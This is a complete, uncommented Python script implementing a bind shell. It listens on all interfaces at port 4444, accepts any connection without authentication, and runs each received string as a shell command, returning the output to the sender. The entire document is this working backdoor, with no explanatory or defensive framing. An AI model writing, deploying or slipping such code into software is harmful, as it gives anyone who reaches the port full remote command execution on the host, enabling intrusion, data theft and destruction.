import socket
import subprocess

def handle_client(conn):
    while True:
        command = conn.recv(1024).decode('utf-8')
        if command.lower() == 'exit':
            break
        if command:
            output = subprocess.run(command, shell=True, capture_output=True, text=True)
            result = output.stdout + output.stderr
            conn.send(result.encode('utf-8'))

    conn.close()

def main():
    IP = '0.0.0.0' 
    PORT = 4444

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((IP, PORT))
    server.listen(5)
    print(f"Listening on {IP}:{PORT}...")

    while True:
        conn, addr = server.accept()
        print(f"Connection from {addr}")
        handle_client(conn)

if __name__ == "__main__":
    main()
